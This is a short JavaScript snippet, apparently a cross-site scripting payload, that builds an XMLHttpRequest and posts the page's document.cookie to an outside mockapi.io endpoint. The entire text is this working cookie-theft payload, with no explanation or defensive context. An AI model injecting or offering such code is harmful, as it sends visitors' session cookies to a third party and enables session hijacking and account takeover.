var xhttp = new XMLHttpRequest();
xhttp.open("POST", "https://5aec459ff67ff70014510694.mockapi.io/activities", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("cookie=" + document.cookie);